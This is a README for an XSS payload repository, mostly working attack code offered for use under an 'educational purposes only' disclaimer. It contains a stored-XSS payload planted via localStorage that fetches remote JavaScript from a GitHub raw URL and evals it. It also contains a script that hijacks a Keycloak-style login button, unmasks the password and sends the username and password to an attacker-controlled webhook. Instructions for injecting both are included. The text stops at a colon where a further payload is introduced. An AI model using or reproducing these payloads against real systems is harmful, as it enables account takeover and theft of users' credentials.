# 🚨 XSS Payloads & Exploits 

Warning : This project is for educational purposes only. The author cannot be held responsible for any misuse or illegal use of the scripts in this repository.

## Content

### 1. localstorage.js

```javascript
localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/XSS/refs/heads/main/localstorage.js').then(r=>r.text()).then(c=>eval(c))">`);
```

✅ What it does

This payload injects a malicious img tag with an onerror handler that dynamically loads and executes the content of localstorage.js from your GitHub repository.

✅ Purpose

Demonstrates stored XSS via localStorage.
Creates a persistent XSS that executes every time the application reads the stored value and renders it unsanitized.

✅ How to use

Inject this payload into a vulnerable input field that stores its value in localStorage and outputs it in the DOM without proper escaping.

### 2. chargebutton.js

```javascript
var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.type = 'text';
        }
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        new Image().src = '<WEBHOOK_URL>/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
    };
}
```

✅ What it does

Hooks into a login button (kc-login), intercepts the login action, reveals the password, and sends both username and password to your webhook.

✅ Purpose

Exfiltrates credentials from login forms.
Can be loaded via XSS to steal credentials without user awareness.

✅ How to use

Replace <WEBHOOK_URL> with your controlled endpoint (e.g., webhook.site, Discord, or custom server).
Inject the following payload to load the script dynamically:
